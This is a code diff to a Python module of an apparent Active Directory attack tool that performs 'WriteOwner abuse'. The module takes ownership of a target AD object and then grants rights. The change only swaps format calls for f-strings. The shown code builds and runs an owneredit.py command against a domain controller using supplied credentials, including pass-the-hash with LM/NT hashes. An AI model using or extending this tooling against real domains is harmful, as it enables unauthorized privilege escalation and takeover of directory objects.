@@ -1,5 +1,4 @@
 """WriteOwner abuse — take ownership of AD object then grant rights."""
-from __future__ import annotations
 import subprocess
 import sys
 import shutil
@@ -26,7 +25,7 @@ def run(args: Any) -> int:
         print("[!] --target-dn required", file=sys.stderr)
         return 1
 
-    print("[*] WriteOwner abuse: set owner of {} to {}".format(target_dn, new_owner))
+    print(f"[*] WriteOwner abuse: set owner of {target_dn} to {new_owner}")
 
     if shutil.which("owneredit.py"):
         cmd = [
@@ -35,10 +34,10 @@ def run(args: Any) -> int:
             "-new-owner", new_owner,
             "-target-dn", target_dn,
             "-dc-ip", dc_ip,
-            "{}\\{}".format(args.domain, cred.username),
+            f"{args.domain}\\{cred.username}",
         ]
         if cred.has_hash:
-            cmd.extend(["-hashes", "{}:{}".format(cred.lm_hash, cred.nt_hash)])
+            cmd.extend(["-hashes", f"{cred.lm_hash}:{cred.nt_hash}"])
 
         print("[*] {}".format(" ".join(cmd)))
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
